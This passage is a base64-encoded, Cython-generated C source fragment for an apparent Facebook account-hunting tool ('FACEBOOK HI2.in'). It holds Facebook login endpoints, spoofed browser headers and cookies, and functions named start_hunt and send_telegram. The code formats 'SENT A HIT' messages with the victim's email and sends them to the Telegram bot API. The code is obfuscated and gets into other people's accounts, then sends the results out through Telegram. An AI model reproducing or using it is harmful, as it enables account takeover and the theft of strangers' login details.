l4X2tfU2VsZWN0ZWRfQm90aF9kb21haW5zW10gPSAiU2VsZWN0ZWQ6IEJvdGggZG9tYWlucyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaGkyX2ZiX2xvY2Fsc19nZW5leHByW10gPSAiaGkyX2ZiLjxsb2NhbHM+LmdlbmV4cHIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3ByZWZpbGxfY29udGFjdF9wb2ludFtdID0gInByZWZpbGxfY29udGFjdF9wb2ludCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfU2VsZWN0ZWRfdGVsZWdtYWlsX2NvbVtdID0gIlNlbGVjdGVkOiBAdGVsZWdtYWlsLmNvbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfVV8xX0lXQVdIRl8xX3FfRl8xX1FfYVtd""ID0gIlwyMDBcMDAxXDMzMFwwMDRcMDEwXDIxMFwwMDFcMzMwXDAwNFwwMTBcMjEwXDAwNVwyMTBVXDIyMCFcMjIwMVwzMzBcMDEwXDAxNFwyMTBJXDIyMFdcMjMwQVwyMzBXXDI0MEhcMjUwRlwyNjAhXDMzMFwwMTBcdFwyMTBcMDMyXDIyMDFcMzMwXDAxMFx0XDIxMFwwMjZcMjEwcVwzMzBcMDEwXHRcMjEwXDAyN1wyMjBcMDAxXDIyMFwwMjFcMzMwXDAxMFwwMTRcMjEwRlwyMjAhXDIyMDFcMzMwXDAwNFwwMTBcMjEwXDAwNVwyMTBRXDMzMFwwMTBcdFwyMTBcMDI1XDIxMGEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2hhZF9wYXNzd29yZF9wcmVmaWxsZWRbXSA9ICJoYWRfcGFzc3dvcmRfcHJlZmlsbGVkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc193d3dfZmFjZWJvb2tfY29tW10gPSAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19iX1NFTlRfQV9ISVRfYl9iX01haWxfYltdID0gIjxiPiNcMzYwXDIzNVwyMjdcMjQ1XDM2MFwyMzVcMjI3XDIyNFwzNjBcMjM1XDIyN1wyMjdcMzYwXDIzNVwyMjdcMjMzXDM2MFwyMzVcMjI3XDIzMFwzNjBcMjM1XDIyN1wyNTQgU0VOVCBBIEhJVDwvYj5cblxuPGI+TWFpbCA6PC9iPiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzEwMTczMjYyOF8zQlRfM0EyOTMxMzY4OVtdID0gIjEwMTczMjYyOCUzQlQlM0EyOTMxMzY4OSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGpkampzYmRuc25zbnNqc25lanNqanpiW10gPSAiOmRqZGpqc2JkbnNuc25zanNuZWpzamp6YiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2lSNWFIZGNISU50bVlkMXNGdGI3Zmp0W10gPSAiZ2lSNWFIZGNISU50bVlkMXNGdGI3Zmp0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19naVI1YU9JdUVScjNvaW1kVlhMSEJTQklbXSA9ICJnaVI1YU9JdUVScjNvaW1kVlhMSEJTQkkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3VwZ3JhZGVfaW5zZWN1cmVfcmVxdWVzdHNbXSA9ICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19HQTFfMV82MjYzOTY4MjNfMTc1NDY2NDQwMFtdID0gIkdBMS4xLjYyNjM5NjgyMy4xNzU0NjY0NDAwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19odHRwc19hcGlfdGVsZWdyYW1fb3JnX2JvdFtdID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NlY19jaF91YV9wbGF0Zm9ybV92ZXJzaW9uW10gPSAic2VjLWNoLXVhLXBsYXRmb3JtLXZlcnNpb24iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzYxNTU1ODY2MTY3NTY3XzNBbTBjQXpwaHU1eFtdID0gIjYxNTU1ODY2MTY3NTY3JTNBbTBjQXpwaHU1eCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc2VjX2NoX3ByZWZlcnNfY29sb3Jfc2NoZW1lW10gPSAic2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lIjsKc3RhdGljIGNvbnN0IGNoYXIg""X19weXhfa19zZWNfY2hfdWFfZnVsbF92ZXJzaW9uX2xpc3RbXSA9ICJzZWMtY2gtdWEtZnVsbC12ZXJzaW9uLWxpc3QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFfOTJtXzM4XzVfNTBtX0ZBQ0VCT09LX0hJMl9pbltdID0gIlwwMzNbMTs5Mm1cMDMzWzM4OzU7NTBtICNGQUNFQk9PSyBISTIuaW4gQlkgI1JBREhFWSBcMzQyXDIwMFwyNDIgQEJvbG9SYWRoZXlcMDMzWzBtIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BVV9RX0JkX1JxX1dfMjJERHV1X1pfWl9NX01fUl9SW10gPSAiXDIwMFwwMDFcMzMwXDAwNFwwMTBcMjEwXDAwMVwzMzBcMDA0XDAxMFwyMTBcMDAxXDMzMFwwMDRcMDEwXDIxMFwwMDFcMzMwXDAwNFwwMDVcMzMwXDAwNFwwMTBcMjEwXDAxMFwyMjBcMDEwXDIzMFwwMDFcMzMwXDAwNFwwMDVcMzMwXDAxMFwwMTRcMjEwQVwyMTBVXDIyMCNcMjIwUVwzMzBcMDEwXDAxNFwyMTBCXDIxMGRcMjIwI1wyMjBSXDIyMHFcMjMwXDAwMVwzMzBcMDEwXHJcMjEwV1wzMjBcMDI0MlwzMjAyRFwzMjBEdVwzMjB1fVwzNjBcMDAwXDAwMH5cMDAxWlwwMDJcMzYwXDAwMFwwMDBaXDAwMmBcMDAyXDM2MFwwMDBcMDAwYFwwMDJ8XDAwMlwzNjBcMDAwXDAwMHxcMDAyTVwwMDNcMzYwXDAwMFwwMDBNXDAwM1JcMDAzXDM2MFwwMDBcMDAwUlwwMDNYXDAwM1wzNjBcMDAwXDAwMFhcMDAzY1wwMDNcMzYwXDAwMFwwMDBjXDAwM2tcMDAzXDM2MFwwMDBcMDAwa1wwMDNwXDAwM1wzNjBcMDAwXDAwMHBcMDAzeFwwMDNcMzYwXDAwMFwwMDB4XDAwM31cMDAzXDM2MFwwMDBcMDAwfVwwMDNHXDAwNFwzNjBcMDAwXDAwMEdcMDA0WVwwMDRcMzYwXDAwMFwwMDBZXDAwNF9cMDA0XDM2MFwwMDBcMDAwX1wwMDRgXDAwNFwzMzBcclwwMjNcMzYwXDAwMFwwMDBcMDI0UFwwMDJcMzYwXDAwMFwwMDBQXDAwMlpcMDAyXDM2MFwwMDBcMDAwWlwwMDJjXDAwMlwzNjBcMDAwXDAwMGNcMDAyalwwMDJcMzYwXDAwMFwwMDBqXDAwMklcMDAzXDM2MFwwMDBcMDAwSVwwMDNTXDAwM1wzNjBcMDAwXDAwMFNcMDAzSlwwMDRcMzYwXDAwMFwwMDBKXDAwNFRcMDA0XDM2MFwwMDBcMDAwVFwwMDRVXDAwNFwzMzBcMDEwXHJcMjEwXVwzMjBcMDMyLlwyNTBqXDM2MFwwMDBcMDAwOURcMDAzXDM2MFwwMDBcMDAwRFwwMDNXXDAwM1wzNjBcMDAwXDAwMFdcMDAzaVwwMDNcMzYwXDAwMFwwMDBpXDAwM3pcMDAzXDM2MFwwMDBcMDAwelwwMDNHXDAwNFwzNjBcMDAwXDAwMEdcMDA0V1wwMDRcMzYwXDAwMFwwMDBXXDAwNHxcMDA0XDM2MFwwMDBcMDAwfFwwMDRDXDAwNVwzNjBcMDAwXDAwMENcMDA1SFwwMDVcMzYwXDAwMFwwMDBIXDAwNVJcMDA1XDM2MFwwMDBcMDAwUlwwMDVuXDAwNVwzNjBcMDAwXDAwMG5cMDA1eVwwMDVcMzYwXDAwMFwwMDB5XDAwNV9cMDA2XDM2MFwwMDBcMDAwX1wwMDZ+XDAwNlwzNjBcMDAwXDAwMH5cMDA2R1wwMDdcMzYwXDAwMFwwMDBHXDAwN1RcMDA3XDM2MFwwMDBcMDAwVFwwMDdVXDAwN1wzMzBccixcMzIwLGdcMzIwZ3tcMzYwXDAwMFwwMDB8XDAw""MUJcMDAyXDM2MFwwMDBcMDAwQlwwMDJVXDAwMlwzNjBcMDAwXDAwMFVcMDAyW1wwMDJcMzYwXDAwMFwwMDBbXDAwMnFcMDAyXDM2MFwwMDBcMDAwcVwwMDJ8XDAwMlwzNjBcMDAwXDAwMHxcMDAyWlwwMDNcMzYwXDAwMFwwMDBaXDAwM2BcMDAzXDM2MFwwMDBcMDAwYFwwMDNyXDAwM1wzNjBcMDAwXDAwMHJcMDAzflwwMDNcMzYwXDAwMFwwMDB+XDAwM1BcMDA0XDM2MFwwMDBcMDAwUFwwMDRcXFwwMDRcMzYwXDAwMFwwMDBcXFwwMDRuXDAwNFwzNjBcMDAwXDAwMG5cMDA0fVwwMDRcMzYwXDAwMFwwMDB9XDAwNE9cMDA1XDM2MFwwMDBcMDAwT1wwMDVVXDAwNVwzNjBcMDAwXDAwMFVcMDA1clwwMDVcMzYwXDAwMFwwMDByXDAwNXdcMDA1XDM2MFwwMDBcMDAwd1wwMDVFXDAwNlwzNjBcMDAwXDAwMEVcMDA2blwwMDdcMzYwXDAwMFwwMDBuXDAwN0BcMDEwXDM2MFwwMDBcMDAwQFwwMTBBXDAxMFwzMzBcMDEwXHJcMzIwXHJcMDM2XDIzMGVcMjQwN1wyNTAhXDMzMFwwMTBcMDE0XDIxMENcMjEwcVwyMjBcMDAzXDIyMDFcMjIwRFwyMzBcMDA1XDIzMFFcMzMwXDAxMFxyXDIxMFtcMjMwXDAxMFwyNDBcMDA3XDI0MH9cMjYwa1wzMDBcMDIzXDMwME1cMzIwUVRcMzIwVGZcMzIwZmlcMzIwaXtcMzIwe35cMzYwXDAwMFwwMDB/XDAwMU5cMDAyXDM2MFwwMDBcMDAwTlwwMDJRXDAwMlwzNjBcMDAwXDAwMFFcMDAyW1wwMDJcMzYwXDAwMFwwMDBbXDAwMmBcMDAyXDM2MFwwMDBcMDAwYFwwMDJsXDAwMlwzNjBcMDAwXDAwMGxcMDAydFwwMDJcMzYwXDAwMFwwMDB0XDAwMn5cMDAyXDM2MCIiXDAwMFwwMDB+XDAwMnpcMDAzXDM2MFwwMDBcMDAwelwwMDNEXDAwNFwzNjBcMDAwXDAwMERcMDA0U1wwMDRcMzYwXDAwMFwwMDBTXDAwNFxcXDAwNFwzNjBcMDAwXDAwMFxcXDAwNGpcMDA0XDM2MFwwMDBcMDAwalwwMDR9XDAwNFwzNjBcMDAwXDAwMH1cMDA0fDJcMzYwXDAwMFwwMDB8MkUzXDM2MFwwMDBcMDAwRTNIM1wzNjBcMDAwXDAwMEgzYTNcMzYwXDAwMFwwMDBhM2QzXDM2MFwwMDBcMDAwZDN2M1wzNjBcMDAwXDAwMHYzeTNcMzYwXDAwMFwwMDB5M0k0XDM2MFwwMDBcMDAwSTRMNFwzNjBcMDAwXDAwMEw0ZDRcMzYwXDAwMFwwMDBkNGc0XDM2MFwwMDBcMDAwZzR9NFwzNjBcMDAwXDAwMH00QDVcMzYwXDAwMFwwMDBANVQ1XDM2MFwwMDBcMDAwVDVcXDVcMzYwXDAwMFwwMDBcXDV2NVwzNjBcMDAwXDAwMHY1fzVcMzYwXDAwMFwwMDB/NU82XDM2MFwwMDBcMDAwTzZJN1wzNjBcMDAwXDAwMEk3VDdcMzYwXDAwMFwwMDBUN1Y3XDM2MFwwMDBcMDAwVjdpN1wzNjBcMDAwXDAwMGk3ajdcMzMwXDAxMFx0XDMzMFwwMTRcMDIwXDIyMFwwMDFcMjIwXDAyNVwyMjBhXDIyMHFcMzMwXDAyN1wwMzZcMjMwY1wyNDBcMDMwXDI1MFwwMjNcMjUwSFwyNjBDXDI2MHVcMjcwQ1wyNzB4XDMwMHNcMzEwIVwzMzBcMDE0XDAxN1wzMjBcMDE3IVwyNDBcMDIzXDI0MEFcMzMwXDAyNVwwMjZcMzMwXDAyNCFcMjQwXDAyMVwzMzBcMDIwXDAyNVwyMjBRXDIyMGJcMjMwXHJcMzIwJTlcMzIw""OU5cMzEwYVwzNDBcMDI1XDAyNlwzMzBcMDI0IVwyNDBcMDIxXDMzMFwwMjBcMDI1XDIyMFFcMjIwYlwyMzBcMDA0XDIzMElcMzIwJTxcMzIwPFFcMzIwUVRcMzIwVFVcMzMwXDAyMFwwMjRcMjIwQlwzMjBcMDI2RVwzMDBRXDMzMFwwMjBcMDMxXDIzMFwwMjdcMjQwXDAwMVwyNDBcMDI3XDI1MFwwMTdcMjYwdlwyNzBUXDMwMFwwMjZcMzAwcVwzMzBcMDEwXDAxN1wyMTB4XDMyMFwwMjcsXDI1MEFcMzMwXDAyMVwwMjJcMzMwXDAyMFwwMzVcMjMwUVwzMzBcMDE0XDAyMVwyMjBcMDIxXDMzMFwwMjBcMDIyXDIyMCRcMjIwbFwzMjBcIjZcMzIwNlNcMzIwU1ZcMzIwVldcMzMwXDAxMFwwMTRcMjEwRlwyMjAhXDIyMDEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0Nocm9taXVtX3ZfMTM3XzBfNzMzN18wX05vdF9BX0JbXSA9ICJcIkNocm9taXVtXCI7dj1cIjEzNy4wLjczMzcuMFwiLCBcIk5vdC9BKUJyYW5kXCI7dj1cIjI0LjAuMC4wXCIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0Nocm9taXVtX3ZfMTM3X05vdF9BX0JyYW5kX3ZfMjRbXSA9ICJcIkNocm9taXVtXCI7dj1cIjEzN1wiLCBcIk5vdC9BKUJyYW5kXCI7dj1cIjI0XCIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RleHRfaHRtbF9hcHBsaWNhdGlvbl94aHRtbF94bWxbXSA9ICJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC43IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18welRtaGhoQTJBeHBjbkhCVF9BV2ZyX0h1aEQyc2U0TFtdID0gIjB6VG1oaGhBMkF4cGNuSEJULkFXZnJfSHVoRDJzZTRMNlJKeDRKenY1TnplM0ZkTkZhUl8xY3J0d2kzX0lRZkdvYzlOYy5Cb2VTU0MuLkFBQS4wLjAuQm8xWHZ4LkFXZmN1VWI0MVhITGJHQkRVTG14cndsM3BxQSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMjBfM0F4QnZBUDFTY3Y1Vm5Td18zQTJfM0ExNzU4ODJbXSA9ICIyMCUzQXhCdkFQMVNjdjVWblN3JTNBMiUzQTE3NTg4MjEzNTIlM0EtMSUzQS0xIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVtdID0gIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfR1MyXzFfczE3NTg4MjE3NTFfbzJfZzBfdDE3NTg4MjFbXSA9ICJHUzIuMS5zMTc1ODgyMTc1MSRvMiRnMCR0MTc1ODgyMTc1MSRqNjAkbDAkaDAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX01vemlsbGFfNV8wX1gxMV9MaW51eF94ODZfNjRfQXBwW10gPSAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIFNhZmFyaS81MzcuMzYiOwpzdGF0aWMg""Y29uc3QgY2hhciBfX3B5eF9rX2FwcGxpY2F0aW9uX3hfd3d3X2Zvcm1fdXJsZW5jb2RlW10gPSAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19leUl6TURBd01DSTZXM3NpZENJNk1UYzFOek0xTWpBNFtdID0gImV5SXpNREF3TUNJNlczc2lkQ0k2TVRjMU56TTFNakE0TlM0NE5Ua3NJbU4wZUNJNmV5SmpiaUk2SW1oMGRIQnpPaTh2ZDNkM0xtWmhZMlZpYjI5ckxtTnZiUzlzYjJkcGJpNXdhSEFpZlN3aWRpSTZabUZzYzJWOVhTd2lNekF3TURFaU9sdDdJblFpT2pFM05UY3pOVEl3T0RVdU9EWXlMQ0pqZEhnaU9uc2lZMjRpT2lKb2RIUndjem92TDNkM2R5NW1ZV05sWW05dmF5NWpiMjB2Ykc5bmFXNHVjR2h3SW4wc0luWWlPakI5WFN3aU16QXdNRElpT2x0N0luUWlPakUzTlRjek5USXdPRFV1T0RZekxDSmpkSGdpT25zaVkyNGlPaUpvZEhSd2N6b3ZMM2QzZHk1bVlXTmxZbTl2YXk1amIyMHZiRzluYVc0dWNHaHdJbjBzSW5ZaU9qQjlYU3dpTXpBd01ETWlPbHQ3SW5RaU9qRTNOVGN6TlRJd09EVXVPRFl6TENKamRIZ2lPbnNpWTI0aU9pSm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmJHOW5hVzR1Y0dod0luMHNJbllpT2xzaVlYSXRSVWNpTENKaGNpSXNJbVZ1TFZWVElpd2laVzRpWFgxZExDSXpNREF3TkNJNlczc2lkQ0k2TVRjMU56TTFNakE0TlM0NE5qVXNJbU4wZUNJNmV5SmpiaUk2SW1oMGRIQnpPaTh2ZDNkM0xtWmhZMlZpYjI5ckxtTnZiUzlzYjJkcGJpNXdhSEFpZlN3aWRpSTZNVFV3ZlYwc0lqTXdNREExSWpwYmV5SjBJam94TnpVM016VXlNRGcxTGpnMk5pd2lZM1I0SWpwN0ltTnVJam9pYUhSMGNITTZMeTkzZDNjdVptRmpaV0p2YjJzdVkyOXRMMnh2WjJsdUxuQm9jQ0o5TENKMklqcDdJbmNpT2pnNU1Td2lhQ0k2TVRZek5IMTlYU3dpTXpBd01EY2lPbHQ3SW5RaU9qRTNOVGN6TlRJd09EVXVPRFkzTENKamRIZ2lPbnNpWTI0aU9pSm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmJHOW5hVzR1Y0dod0luMHNJbllpT2lKa1pXWmhkV3gwSW4xZExDSXpNREF3T0NJNlczc2lkQ0k2TVRjMU56TTFNakE0Tmk0d01qTXNJbU4wZUNJNmV5SmpiaUk2SW1oMGRIQnpPaTh2ZDNkM0xtWmhZMlZpYjI5ckxtTnZiUzlzYjJkcGJpNXdhSEFpZlN3aWRpSTZJbkJ5YjIxd2RDSjlYU3dpTXpBd01USWlPbHQ3SW5RaU9qRTNOVGN6TlRJd09EVXVPRGM0TENKamRIZ2lPbnNpWTI0aU9pSm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmJHOW5hVzR1Y0dod0luMHNJbllpT2lKSGIyOW5iR1VnU1c1akxpSjlYU3dpTXpBd01UTWlPbHQ3SW5RaU9qRTNOVGN6TlRJd09EVXVPRGM0TENKamRIZ2lPbnNpWTI0aU9pSm9kSFJjWE02THk5M2QzY3VabUZqWldKdmIyY3VZMjl0TDJ4dloybHVMbkJvY0NKOUxDSjJJam9pTlM0d0lDaFlNVEU3SUV4cGJuVjRJSGc0Tmw4Mk5Da2dRWEJ3YkdWWFpXSkxhWFF2TlRNM0xqTTJJQ2hMU0ZSTlRDd2diR2xyWlNCSFpXTnJieWtn""UTJoeWIyMWxMekV6Tnk0d0xqQXVNQ0JUWVdaaGNta3ZOVE0zTGpNMkluMWRMQ0l6TURBeE5TSTZXM3NpZENJNk1UYzFOek0xTWpBNE5TNDROemdzSW1OMGVDSTZleUpqYmlJNkltaDBkSEJ6T2k4dmQzZDNMbVpoWVdObFltOXZheTVqYjIwdmJHOW5hVzR1Y0dod0luMHNJbllpT2lKTWFXNTFlQ0JoY20xMk9ERWlmU3g3SW5RaU9qRTNOVGN6TlRJd09EVXVPRGM0TENKamRIZ2lPbnNpWTI0aU9pSm9kSFJ3Y3pvdkwzZDNkeTVtWVdObFltOXZheTVqYjIwdmJHOW5hVzR1Y0dod0luMHNJbllpT2lKTWFXNTFlQ0JoY20xMk9ERWlmVjBzSWpNd01ERTRJanBiZXlKMElqb3hOelUzTXpVeU1EZzFMamczT1N3aVkzUjRJanA3SW1OdUlqb2lhSFIwY0hNNkx5OTNkM2N1Wm1GalpXSnZiMnN1WTI5dEwyeHZaMmx1TG5Cb2NDSjlMQ0oySWpvNGZWMHNJak13TURJeUlqcGJleUowSWpveE56VTNNelV5TURnMUxqa3hOaXdpWTNSNElqcDdJbU51SWpvaWFIUjBjSE02THk5M2QzY3VabUZqWldKdmIyc3VZMjl0TDJ4dloybHVMbkJvY0NKOUxDSjJJanAwY25WbGZWMHNJak13TURRd0lqcGJleUowSWpveE56VTNNelV5TURnMUxqa3hOeXdpWTNSNElqcDdJbU51SWpvaWFIUjBjSE02THk5M2QzY3VabUZqWldKdmIyc3VZMjl0TDJ4dloybHVMbkJvY0NKOUxDSjJJam90TVRnd2ZWMHNJIiJqTXdNRGt6SWpwYmV5SjBJam94TnpVM016VXlNRGcxTGpreE9Dd2lZM1I0SWpwN0ltTnVJam9pYUhSMGNITTZMeTkzZDNjdVptRmpaV0p2YjJzdVkyOXRMMnh2WjJsdUxuQm9jQ0o5TENKMklqbzFmVjBzSWpNd01EazBJanBiZXlKMElqb3hOelUzTXpVeU1EZzFMamt4T0N3aVkzUjRJanA3SW1OdUlqb2lhSFIwY0hNNkx5OTNkM2N1Wm1GalpXSnZiMnN1WTI5dEwyeHZaMmx1TG5Cb2NDSjlMQ0oySWpvaVRXOTZhV3hzWVM4MUxqQWdLRmd4TVRzZ1RHbHVkWGdnZURnMlh6WTBLU0JCY0hCc1pWZGxZa3RwZEM4MU16Y3VNellnS0V0SVZFMU1MQ0JzYVd0bElFZGxZMnR2S1NCRGFISnZiV1V2TVRNM0xqQXVNQzR3SUZOaFptRnlhUzgxTXpjdU16WWlmVjBzSWpNd01EazFJanBiZXlKMElqb3hOelUzTXpVeU1EZzFMamt4T0N3aVkzUjRJanA3SW1OdUlqb2lhSFIwY0hNNkx5OTNkM2N1Wm1GalpXSnZiMnN1WTI5dEwyeHZaMmx1TG5Cb2NDSjlMQ0oySWpveE9YMWRMQ0l6TURFd05pSTZXM3NpZENJNk1UYzFOek0xTWpBNE5TNDRNamdzSW1OMGVDSTZleUpqYmlJNkltaDBkSEJ6T2k4dmQzZDNMbVpoWTJWaWIyOXJMbU52YlM5c2IyZHBiaTV3YUhBaWZTd2lkaUk2Wm1Gc2MyVjlMSHNpZENJNk1UYzFOek0xTWpBNE9TNHhNeklzSW1OMGVDSTZleUpqYmlJNkltaDBkSEJ6T2k4dmQzZDNMbVpoWTJWaWIyOXJMbU52YlM5c2IyZHBiaTV3YUhBaWZTd2lkaUk2ZEhKMVpYMWRMQ0l6TURFd055STZXM3NpZENJNk1UYzFOek0xTWpBNE5TNDRNamdzSW1OMGVDSTZleUpqYmlJNkltaDBkSEJ6T2k4dmQzZDNMbVpoWTJWaWIyOXJMbU52YlM5c2IyZHBiaTV3YUhBaWZTd2lkaUk2Wm1Gc2MyVjlMSHNpZENJNk1U""YzFOek0xTWpBNE5pNDNNU3dpWTNSNElqcDdJbU51SWpvaWFIUjBjSE02THk5M2QzY3VabUZqWldKdmIyc3VZMjl0TDJ4dloybHVMbkJvY0NKOUxDSjJJanAwY25WbGZWMTkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2V5SjNJam96TmpBc0ltZ2lPamd3TUN3aVlYY2lPak0yW10gPSAiZXlKM0lqb3pOakFzSW1naU9qZ3dNQ3dpWVhjaU9qTTJNQ3dpWVdnaU9qZ3dNQ3dpWXlJNk1qUjkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2h0dHBzX3d3d19mYWNlYm9va19jb21fbG9naW5fZGV2W10gPSAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaHR0cHNfd3d3X2ZhY2Vib29rX2NvbV9sb2dpbl9waHBbXSA9ICJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ucGhwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa192Ml8zQmNsaWVudF92ZXJzaW9uXzNBMjkzNV8zQnRpbVtdID0gInYyJTNCY2xpZW50X3ZlcnNpb24lM0EyOTM1JTNCdGltZXN0YW1wJTNBMTc1ODgyMTM2MSI7CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJnYV9zZW5kX3RlbGVncmFtKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X21lc3NhZ2UpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yZ2FfNmhpMl9mYl9nZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKTsgCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmdhXzJoaTJfZmIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl90aHJlYWRfaWQpOyAKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yZ2FfNHN0YXJ0X2h1bnQoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZik7IApzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKFB5VHlwZU9iamVjdCAqdCwgUHlPYmplY3QgKmEsIFB5T2JqZWN0ICprKTsgCgoKCiNpZm5kZWYgQ1lUSE9OX1NNQUxMX0NPREUKI2lmIGRlZmluZWQoX19jbGFuZ19fKQogICAgI2RlZmluZSBDWVRIT05fU01BTExfQ09ERQojZWxpZiBkZWZpbmVkKF9fR05VQ19fKSAmJiAoX19HTlVDX18gPiA0IHx8IChfX0dOVUNfXyA9PSA0ICYmIF9fR05VQ19NSU5PUl9fID49IDMpKQogICAgI2RlZmluZSBDWVRIT05fU01BTExfQ09ERSBfX2F0dHJpYnV0ZV9fKChjb2xkKSkKI2Vsc2UKICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREUKI2VuZGlmCiNlbmRpZgoKdHlwZWRlZiBzdHJ1Y3QgewogIFB5T2JqZWN0ICpfX3B5eF9kOwogIFB5T2JqZWN0ICpfX3B5eF9iOwogIFB5T2JqZWN0ICpfX3B5eF9jeXRob25fcnVudGltZTsKICBQeU9iamVjdCAqX19weXhfZW1wdHlfdHVwbGU7CiAgUHlPYmpl""Y3QgKl9fcHl4X2VtcHR5X2J5dGVzOwogIFB5T2JqZWN0ICpfX3B5eF9lbXB0eV91bmljb2RlOwogICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0N5RnVuY3Rpb25UeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQKICBQeVR5cGVPYmplY3QgKl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfR2VuZXJhdG9yVHlwZTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfSXRlcmFibGVDb3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfSXRlcmFibGVDb3JvdXRpbmVUeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lQXdhaXRUeXBlOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lVHlwZTsKICAjZW5kaWYKICBQeU9iamVjdCAqX19weXhfdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByOwogIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcjsKICBfX1B5eF9DYWNoZWRDRnVuY3Rpb24gX19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3A7CiAgUHlPYmplY3QgKl9fcHl4X3R1cGxlWzJdOwogIFB5T2JqZWN0ICpfX3B5eF9jb2Rlb2JqX3RhYls0XTsKICBQeU9iamVjdCAqX19weXhfc